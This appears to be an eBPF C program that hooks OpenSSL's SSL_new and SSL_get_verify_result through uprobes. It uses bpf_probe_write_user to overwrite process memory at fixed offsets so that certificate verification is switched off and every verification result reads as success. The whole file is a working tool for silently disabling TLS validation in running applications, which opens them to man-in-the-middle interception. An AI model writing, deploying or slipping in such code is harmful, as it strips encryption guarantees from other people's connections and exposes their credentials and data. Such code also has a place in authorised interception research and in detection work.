// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "MIT";

/******************************************************************************/
/*!
 *  \brief  Hook SSL_new to everride the verify mode to SSL_VERIFY_NONE
 */

SEC("uprobe/SSL_new")
int change_verify_mode(struct pt_regs *ctx) {
	
    if (!PT_REGS_PARM1(ctx))
        return 0;
    
    void* ssl_ctx = (int*)PT_REGS_PARM1(ctx);    
    
    int new_verify_mode = 0;
    bpf_probe_write_user(ssl_ctx+0x160, &new_verify_mode, sizeof(int)); // ssl_ctx->verify_mode = SSL_VERIFY_NONE
    
    return 0;
};

SEC("uprobe/SSL_get_verify_result")
int change_verify_result(struct pt_regs *ctx) {
        
    if (!PT_REGS_PARM1(ctx))
        return 0;

    void* ssl_con = (int*)PT_REGS_PARM1(ctx);
 
    int new_verify_return = 0;
    bpf_probe_write_user(ssl_con+0x5b0, &new_verify_return, sizeof(int)); // ssl_st->verify_result = 0

    return 0;
}
